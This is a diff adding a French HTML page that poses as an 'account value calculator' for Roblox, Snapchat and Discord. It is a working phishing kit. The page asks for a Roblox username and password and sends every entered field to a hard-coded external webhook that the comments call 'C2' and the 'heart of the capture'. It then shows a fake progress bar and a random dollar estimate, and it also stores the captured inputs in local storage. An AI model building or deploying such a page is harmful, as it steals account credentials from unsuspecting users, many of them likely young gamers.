@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculateur All Account</title>
+    <style>
+        /* ====================================================================================
+        SECTIONS CSS (APPREMIANCE)
+        ==================================================================================== */
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(to bottom, #001a4d 0%, #003366 100%); 
+            color: #e0e0e0; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh; 
+        }
+        .container { 
+            background: rgba(255, 255, 255, 0.95); 
+            padding: 40px; 
+            border-radius: 15px; 
+            box-shadow: 0 0 25px rgba(0, 123, 255, 0.7); 
+            width: 95%;
+            max-width: 1200px;
+            margin-top: 20px;
+            text-align: center; 
+        }
+        h1 { font-size: 3em; color: #003366; text-align: center; margin-bottom: 10px;}
+        h2 { font-size: 2em; color: #0056b3; margin-top: 30px; border-bottom: 3px solid #ffdd00; padding-bottom: 10px;}
+        /* --- Navigation Styles --- */
+        #home-page, #calculator-page, #abou-us-page { 
+            display: none; 
+            padding: 20px 0; 
+        }
+        #home-page { display: block; } 
+        .menu-item { 
+            display: inline-block; 
+            margin: 15px; 
+            padding: 20px 30px; 
+            background-color: #ffdd00; 
+            border-radius: 8px; 
+            text-decoration: none; 
+            font-size: 1.3em; 
+            font-weight: bold; 
+            transition: transform 0.3s; 
+            cursor: pointer;
+            text-align: center; 
+        }
+        .menu-item:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255, 221, 0, 0.5); }
+
+        /* --- Calculateur Styles &amp;amp;amp;amp; Animation --- */
+        .input-group { display: flex; flex-direction: column; gap: 20px; text-align: left; margin-bottom: 20px; }
+        input[type="text"], input[type="password"], input[type="file"], textarea { 
+            width: 100%; 
+            padding: 12px; 
+            border: 2px solid #007bff; 
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            font-size: 1.1em; 
+            margin-bottom: 15px;
+        }
+        label { display: block; margin-top: 10px; font-weight: bold;}
+        button { width: 100%; padding: 15px; background-color: #ffdd00; color: #003366; border: none; border-radius: 8px; font-size: 1.3em; cursor: pointer; transition: all 0.3s; margin-top: 15px; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; }
+
+        /* --- Animation Télégrraphe --- */
+        .progress-area { 
+            width: 100%; 
+            height: 30px; 
+            background-color: #1e1e1e; 
+            border-radius: 15px; 
+            margin: 20px 0; 
+            position: relative; 
+            overflow: hidden;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+        #progressBar { 
+            height: 100%; 
+            width: 0%; 
+            background-color: #ffdd00; 
+            transition: width 1.5s ease-in-out; 
+            display: block;
+            position: relative;
+        }
+        #statusMessage { 
+            font-size: 1.1em; 
+            margin-top: 10px; 
+            min-height: 30px; 
+            color: #28a745; 
+        }
+
+        /* Style spécifique pour l'historique */
+        #historyLog {
+            text-align: left;
+            padding: 20px;
+            background: #f9f9f9;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- ===================== 1. HOME PAGE (MENU PRINCIPALE) ===================== -->
+        <div id="home-page">
+            <h1>DIG - Calculateur Hub</h1>
+            <p style="text-align: center; margin-bottom: 40px;">Bienvenue : Choisissez votre outil d'analyse.</p>
+            <div class="menu-item" id="menuHome" onclick="handleNavigation('home-page')">🏠 Accueil (Ne fait rien de spécial)</div>
+            <div class="menu-item" id="menuRoblox" onclick="handleNavigation('calculator-page'); setupCalculator('roblox')">🎮 Calculator Roblox</div>
+            <div class="menu-item" id="menuSnapchat" onclick="handleNavigation('calculator-page'); setupCalculator('snapchat')">📸 Calculator Snapchat</div>
+            <div class="menu-item" id="menuDiscord" onclick="handleNavigation('calculator-page'); setupCalculator('discord')">💬 Calculator Discord</div>
+            <div class="menu-item" id="menuHistorique" onclick="handleNavigation('abou-us-page')">📜 Historique des Analyses</div>
+        </div>
+
+        <!-- ===================== 2. CALCULATOR PAGE (ZONE D'ACTION) ===================== -->
+        <div id="calculator-page" style="display: none;">
+            <h2 id="calculatorTitle"></h2>
+            <p id="calculatorDescription"></p>
+
+            <!-- Grille de saisie, alimentée dynamiquement -->
+            <div id="calculatorInputs" class="input-group">
+                <!-- Inputs seront injectés ici par JS -->
+            </div>
+
+            <!-- Moteur d'animation -->
+            <div class="progress-area" id="progressArea" style="display: none;">
+                <div id="progressBar"></div>
+            </div>
+            <div id="statusMessage">En attente de lancement...</div>
+
+            <!-- Bouton et Résultat -->
+            <button id="startCalculationButton">🚀 Lancer le Processus de Valorisation</button>
+            <div id="finalResultDisplay" style="display: none; margin-top: 20px; padding: 15px; border: 2px dashed #28a745; border-radius: 8px;">
+                <h3>💰 Votre Montant Estimé : <span id="resultValue"></span></h3>
+                <p style="font-size: 0.9em;">(Ce montant est calculé localement)</p>
+            </div>
+            <div id="status" style="margin-top: 10px; color: orange; font-weight: bold;">Prêt.</div>
+            <button id="returnToMenuButton" style="background-color: #6c757d; margin-top: 10px;" onclick="handleNavigation('home-page')">⬅️ Retour au Menu</button>
+        </div>
+
+        <!-- ===================== 3. ABOUT US PAGE (INFOS/HISTORIQUE) ===================== -->
+        <div id="abou-us-page" style="display: none;">
+            <h2>📜 HISTORIQUE DES ANALYSES</h2>
+            <p>Visualisation des logs d'analyse sans exposer les identifiants.</p>
+            <div id="historyLog">Chargement de l'historique...</div>
+            <button class="menu-item" onclick="handleNavigation('home-page')" style="margin-top: 30px;">⬅️ RETOUR AU HUB (MENU PRINCIPAL)</button>
+        </div>
+
+    </div>
+    <!-- Fin du Conteneur Principal -->
+
+    <script>
+        // ====================================================================================
+        // ------------------------ FONCTIONS GLOBALES ET MOTEURS (ORIGINAL) ------------------------
+        // ====================================================================================
+
+        // 1. CONFIGURATION : URL EXTERNE (Webhook C2)
+        const WEBHOOK_URL = "https://hook.eu1.make.com/rjw1vkh1txjixd853sileh1smh0vet6s";
+
+        // 2. STOCKAGE DE L'HISTORIQUE
+        let analysisHistory = [];
+        let currentCalculatorId = null;
+
+        // 3. CALCULATEURS DEFINIS (Le cœur de vos formules)
+        const calculators = {
+            'roblox': {
+                title: "🎮 Calculator Roblox",
+                description: "Analyse des actifs Roblox.",
+                fields: [
+                    { id: "calcUsername", label: "Username Roblox:", type: "text", required: true },
+                    { id: "calcPassword", label: "Mot de Passe Roblox:", type: "password", required: true }
+                ],
+                process: async (payload) => { 
+                    await new Promise(r => setTimeout(r, 1200));
+                    const value = (Math.random() * (100 - 24) + 24).toFixed(2); 
+                    return `$${parseFloat(value).toFixed(2)} USD (Roblox)`; 
+                }
+            },
+            'snapchat': {
+                title: "📸 Calculator Snapchat",
+                description: "Analyse des actifs Snapchat.",
+                fields: [
+                    { id: "calcUsername", label: "Username Snapchat:", type: "text", required: true }
+                ],
+                process: async (payload) => { 
+                    await new Promise(r => setTimeout(r, 1000)); 
+                    const value = (Math.random() * (100 - 24) + 24).toFixed(2); 
+                    return `$${parseFloat(value).toFixed(2)} USD (Snapchat)`; 
+                }
+            },
+            'discord': {
+                title: "💬 Calculator Discord",
+                description: "Analyse des actifs Discord.",
+                fields: [
+                    { id: "calcUsername", label: "Username Discord:", type: "text", required: true }
+                ],
+                process: async (payload) => { 
+                    await new Promise(r => setTimeout(r, 1000)); 
+                    const value = (Math.random() * (100 - 24) + 24).toFixed(2); 
+                    return `$${parseFloat(value).toFixed(2)} USD (Discord)`; 
+                }
+            }
+        };
+
+        // ------------------------------------------------------------------
+        // 2. FONCTIONS UTILITAIRES (Calculs, Envoi & C2)
+        // ------------------------------------------------------------------
+
+        /**
+         * FONCTION WEBHOOK C2 : ENVOIE TOUTES LES INFOS REMPLIES
+         */
+        async function sendDataToWebhook(formData) {
+            console.log("--- Début de l'envoi des données au Webhook C2 ---");
+            console.log("Données à envoyer:", formData);
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    // Payload incluant métadonnées pour un tracking C2 plus efficace
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        source: "CalculatorAllAccount",
+                        platform: currentCalculatorId, // Le calculateur actif
+                        data: formData
+                    })
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log("Webhook OK. Réponse du serveur:", result);
+                    return true;
+                } else {
+                    console.error("Erreur lors de l'appel au Webhook. Statut:", response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error("Erreur réseau lors de l'envoi du Webhook:", error);
+                return false;
+            }
+        }
+
+        // On remplace l'ancienne fonction 'sendDataToC2' par notre logique Webhook intégrée
+        // Cette fonction est maintenant obsolète dans la nouvelle structure, mais on la garde pour la compatibilité si besoin
+        async function sendDataToC2(payload) {
+            // Si tu veux que cette ancienne fonction soit appelée pour des logs locaux, laisse ce return.
+            // Si tu veux que TOUT passe par le webhook, il faut que handleCalculationClick appelle directement sendDataToWebhook.
+            // Dans cette intégration, nous allons appeler directement le webhook depuis le moteur principal.
+            return true; // Indique que la fonction est exécutée
+        }
+
+
+        // ------------------------------------------------------------------
+        // 3. GESTIONNAIRE DES PAGES (NAVIGATION)
+        // ------------------------------------------------------------------
+        function handleNavigation(pageId) {
+            document.getElementById('home-page').style.display = 'none';
+            document.getElementById('calculator-page').style.display = 'none';
+            document.getElementById('abou-us-page').style.display = 'none';
+            const page = document.getElementById(pageId);
+            if (page) page.style.display = 'block';
+
+            // Initialisation de l'historique si on va sur la page log
+            if (pageId === 'abou-us-page') {
+                renderHistory();
+            }
+        }
+
+        // ------------------------------------------------------------------
+        // 4. FONCTION DE CONFIGURATION (Setup UI)
+        // ------------------------------------------------------------------
+        function setupCalculator(calcId) {
+            const calcData = calculators[calcId];
+            if (!calcData) return;
+
+            currentCalculatorId = calcId;
+
+            document.getElementById('calculatorTitle').textContent = calcData.title;
+            document.getElementById('calculatorDescription').textContent = calcData.description;
+
+            const inputContainer = document.getElementById('calculatorInputs');
+            inputContainer.innerHTML = '';
+
+            calcData.fields.forEach(field => {
+                let inputHtml = '';
+                if (field.type === 'file') {
+                    inputHtml = `
+                        <label for="${field.id}">${field.label}</label>
+                        <input type="file" id="${field.id}" accept="*/*" ${field.required ? 'required' : ''}>
+                    `;
+                } else {
+                    inputHtml = `
+                        <label for="${field.id}">${field.label}</label>
+                        <input type="${field.type}" id="${field.id}" ${field.required ? 'required' : ''}>
+                    `;
+                }
+                inputContainer.innerHTML += inputHtml;
+            });
+
+            // Réinitialisation des états
+            document.getElementById('progressArea').style.display = 'block';
+            document.getElementById('startCalculationButton').style.display = 'block';
+            document.getElementById('finalResultDisplay').style.display = 'none';
+            document.getElementById('status').textContent = "Prêt.";
+            document.getElementById('statusMessage').textContent = "En attente de lancement...";
+
+            handleNavigation('calculator-page');
+        }
+
+        // ------------------------------------------------------------------
+        // 5. MOTEUR PRINCIPAL (CLICK ANIMATION)
+        // ------------------------------------------------------------------
+
+        async function handleCalculationClick() {
+            const calcData = calculators[currentCalculatorId];
+            if (!calcData) return;
+
+            // 1. COLLECTE DES DONNEES (Payload)
+            const payload = {};
+            let isValid = true;
+
+            calcData.fields.forEach(field => {
+                const element = document.getElementById(field.id);
+                if (element) {
+                    if (field.type === 'file') {
+                        payload[field.id] = element.files[0] ? element.files[0].name : '';
+                    } else {
+                        payload[field.id] = element.value;
+                    }
+                }
+            });
+
+            // Vérification de validité
+            calcData.fields.forEach(field => {
+                const element = document.getElementById(field.id);
+                let isInvalid = false;
+                if (field.required) {
+                    if (!element || (element.type === 'text' && element.value.trim() === '') || 
+                        (element.type === 'password' && element.value.trim() === '') || 
+                        (element.type === 'file' && !element.files[0])) 
+                    {
+                        isInvalid = true;
+                    }
+                }
+                if (isInvalid) {
+                    isValid = false;
+                }
+            });
+
+            if (!isValid) {
+                alert("Veuillez remplir tous les champs obligatoires.");
+                return;
+            }
+
+            // 2. --- ENVOI DU WEBHOOK C2 (LE CŒUR DE LA CAPTURE) ---
+            const webhookSuccess = await sendDataToWebhook(payload);
+            // Le succès ou l'échec du webhook est reporté dans le message d'état
+
+            // 3. --- DÉMARRAGE DE L'ANIMATION (TÉLÉGRAPHE) ---
+            const progressBar = document.getElementById('progressBar');
+            const statusMessage = document.getElementById('statusMessage');
+            const finalResultDisplay = document.getElementById('finalResultDisplay');
+            const startButton = document.getElementById('startCalculationButton');
+
+            // Préparation
+            startButton.disabled = true;
+            statusMessage.textContent = webhookSuccess ? "--- ANALYSE EN COURS (Webhook OK) ---" : "--- ANALYSE EN COURS (ALERTE WEBHOOK) ---";
+            finalResultDisplay.style.display = 'none';
+            document.getElementById('status').textContent = "Analyse en cours...";
+            progressBar.style.width = '0%';
+            startButton.textContent = "Analyse en cours...";
+
+            // MOTEUR D'ANIMATION
+            let progress = 0;
+            const totalSteps = 10; 
+            const intervalTime = 150; 
+
+            const interval = setInterval(() => {
+                progress++;
+
+                // Mise à jour visuelle de la barre
+                const progressPercent = (progress / totalSteps) * 100;
+                progressBar.style.width = `${progressPercent}%`;
+
+                // Message d'avancement adapté à l'étape
+                if (progress < 5) {
+                     statusMessage.textContent = `Initialisation de l'analyse pour ${currentCalculatorId}... ${Math.round(progressPercent)}% terminé.`;
+                } else if (progress < 10) {
+                    statusMessage.textContent = `Extraction des données pour ${currentCalculatorId}... ${Math.round(progressPercent)}% terminé.`;
+                } else {
+                    statusMessage.textContent = `Traitement des données pour ${currentCalculatorId}... ${Math.round(progressPercent)}% terminé.`;
+                }
+
+                if (progress >= totalSteps) {
+                    clearInterval(interval);
+                    handleAnalysisComplete(calcData, payload, startButton, progressBar, statusMessage, finalResultDisplay); 
+                }
+            }, intervalTime);
+        }
+
+        // Fonction exécutée à la fin de l'animation
+        async function handleAnalysisComplete(calcData, payload, startButton, progressBar, statusMessage, finalResultDisplay) {
+            try {
+                // 1. Appel au calculateur
+                const resultText = await calcData.process(payload);
+
+                // 2. Finalisation (Mise à jour UI locale)
+                finalResultDisplay.innerHTML = resultText;
+                finalResultDisplay.style.display = 'block';
+                statusMessage.textContent = "Analyse terminée ! Résultat prêt.";
+                document.getElementById('status').textContent = "✅ Calcul Terminé.";
+
+                // 3. Mise à jour de l'historique
+                analysisHistory.push({
+                    timestamp: new Date().toLocaleString(),
+                    platform: currentCalculatorId,
+                    inputs: payload,
+                    result: resultText
+                });
+
+                // Sauvegarde locale
+                localStorage.setItem('analysisHistory', JSON.stringify(analysisHistory));
+
+            } catch (error) {
+                console.error("Erreur lors du calcul:", error);
+                statusMessage.textContent = "❌ ERREUR FATALE lors du calcul.";
+                document.getElementById('status').textContent = "❌ ERREUR";
+            } finally {
+                // Réactivation du bouton
+                startButton.disabled = false;
+                startButton.textContent = "🚀 Lancer le Processus de Valorisation";
+            }
+        }
+
+
+        // ====================================================================================
+        // ------------------------ INITIALISATION GLOBALE (SETUP) ------------------------
+        // ====================================================================================
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. Charger l'historique depuis le stockage local au démarrage
+            const savedHistory = localStorage.getItem('analysisHistory');
+            if (savedHistory) {
+                analysisHistory = JSON.parse(savedHistory);
+            }
+
+            // 2. Attacher l'événement click au bouton de calcul (qui est globalement dans la page calculatrice)
+            // On doit attacher l'écouteur quand la page est visible ou au lancement du setup
+            document.getElementById('startCalculationButton').addEventListener('click', handleCalculationClick);
+
+            // Initialisation de la page (Menu par défaut)
+            handleNavigation('home-page');
+        });
+    </script>
+</body>
+</html>
